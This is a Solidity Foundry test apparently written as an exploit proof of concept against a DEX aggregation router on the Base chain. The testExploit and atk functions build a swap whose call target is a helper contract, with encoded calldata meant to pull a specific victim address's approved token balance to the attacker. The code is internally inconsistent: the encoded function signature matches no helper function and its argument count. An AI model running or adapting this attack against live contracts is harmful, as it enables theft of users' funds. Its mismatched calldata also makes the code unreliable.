// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC20.sol";

interface IMetaAggregationRouterV2 {
  struct SwapDescriptionV2 {
    IERC20 srcToken;
    IERC20 dstToken;
    address[] srcReceivers; // transfer src token to these addresses, default
    uint256[] srcAmounts;
    address[] feeReceivers;
    uint256[] feeAmounts;
    address dstReceiver;
    uint256 amount;
    uint256 minReturnAmount;
    uint256 flags;
    bytes permit;
  }

  /// @dev  use for swapGeneric and swap to avoid stack too deep
  struct SwapExecutionParams {
    address callTarget; // call this address
    address approveTarget; // approve this address if _APPROVE_FUND set
    bytes targetData;
    SwapDescriptionV2 desc;
    bytes clientData;
  }

  struct SimpleSwapData {
    address[] firstPools;
    uint256[] firstSwapAmounts;
    bytes[] swapDatas;
    uint256 deadline;
    bytes positiveSlippageData;
  }

  event Swapped(
    address sender,
    IERC20 srcToken,
    IERC20 dstToken,
    address dstReceiver,
    uint256 spentAmount,
    uint256 returnAmount
  );
  event ClientData(bytes clientData);
  event Exchange(address pair, uint256 amountOut, address output);
  event Fee(address token, uint256 totalAmount, uint256 totalFee, address[] recipients, uint256[] amounts, bool isBps);
  function swap(SwapExecutionParams calldata execution) external payable returns (uint256 returnAmount, uint256 gasUsed);
  function callBytes(bytes calldata data) external payable;
    

}

contract metarouterTest is Test {
    IMetaAggregationRouterV2 router = IMetaAggregationRouterV2(0x6131B5fae19EA4f9D964eAc0408E4408b66337b5);
    address vic = 0x8294c888166935581584E307825aCe655F100434;
    IERC20 srcTokenweth = IERC20(0x4200000000000000000000000000000000000006);
    IERC20 dstTokenanon = IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);
    address CallTarget = 0x11ddD59C33c73C44733b4123a86Ea5ce57F6e854;
    uint256 _FEE_ON_DST = 0x40;
    uint256 _FEE_IN_BPS = 0x80;
    address private takefee = 0x0f14177B9FDF853F25cC6D86E7EF851E88f35e97;
    Helper helper;


    function setUp() public {
        vm.createSelectFork("https://base.meowrpc.com/", 20412199);
        deal(address(srcTokenweth), address(this), 10 ether);
        helper = new Helper();
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker srcTokensdc Balance before atk", dstTokenanon.balanceOf(address(this)), 18);
        srcTokenweth.approve(address(router), srcTokenweth.balanceOf(address(this)));

        atk();
        emit log_named_decimal_uint("Attacker srcTokensdc Balance after atk", dstTokenanon.balanceOf(address(this)), 18);
    }

    function atk() internal {
        IERC20 srcToken = srcTokenweth; // Use IERC20 type
        IERC20 dstToken = dstTokenanon; // Use IERC20 type
        address callTarget = address(helper);

        address[] memory srcReceivers = new address[](1);
        srcReceivers[0] = address(helper);
        uint256[] memory srcAmounts = new uint256[](1);
        srcAmounts[0] = 0.5 ether;
        address[] memory feeReceivers = new address[](1);
        feeReceivers[0] = address(takefee);
        uint256[] memory feeAmounts = new uint256[](1);
        feeAmounts[0] = 300;
        address dstReceiver = address(this);
        uint256 amount = 0.5 ether;
        uint256 minReturnAmount = 0.4 ether;
        uint256 flags = _FEE_IN_BPS |_FEE_ON_DST;
        bytes memory permit = "";

        IMetaAggregationRouterV2.SwapDescriptionV2 memory swapDesc = IMetaAggregationRouterV2.SwapDescriptionV2({
            srcToken: srcToken,
            dstToken: dstToken,
            srcReceivers: srcReceivers,
            srcAmounts: srcAmounts,
            feeReceivers: feeReceivers,
            feeAmounts: feeAmounts,
            dstReceiver: dstReceiver,
            amount: amount,
            minReturnAmount: minReturnAmount,
            flags: flags,
            permit: permit
        });

        address approveTarget = address(0);
        uint256 allowance = dstTokenanon.allowance(vic, address(router));
        uint256 balance = dstTokenanon.balanceOf(vic);
        uint256 amuntToDrain = balance < allowance ? balance : allowance;
    
        bytes memory targetData = abi.encodeWithSignature(
            "captureTransferFrom(address,address,uint256)", 
            dstTokenanon,
            vic, 
            address(this),
            amuntToDrain
        );

        bytes memory clientData = "";

        IMetaAggregationRouterV2.SwapExecutionParams memory executionParams = IMetaAggregationRouterV2.SwapExecutionParams({
            callTarget: callTarget,       // Address of the DEX (e.g., Uniswap router)
            approveTarget: approveTarget, // DEX needs approval to spend tokens
            targetData: targetData,       // Encoded swap function call
            desc: swapDesc,               // Swap description created above
            clientData: clientData        // No additional client data
        });

        IMetaAggregationRouterV2(router).swap{value: msg.value}(executionParams);

    }


}

contract Helper {
    IMetaAggregationRouterV2 router = IMetaAggregationRouterV2(0x6131B5fae19EA4f9D964eAc0408E4408b66337b5);
    function setUp() public {}

    function callByte(address token, address from, address to, uint256 amount) external returns (uint256) {
        IERC20 erc20Token = IERC20(token);
        uint256 balanceBefore = erc20Token.balanceOf(to);

        bool success = erc20Token.transferFrom(from, to, amount);
        require(success, "TransferFrom failed");

        uint256 balanceAfter = erc20Token.balanceOf(to);
        uint256 returnAmount = balanceAfter - balanceBefore;

        if (returnAmount > 0) {

            IERC20(erc20Token).transfer(address(router), returnAmount);
       }
       
       
       return returnAmount;
    }

}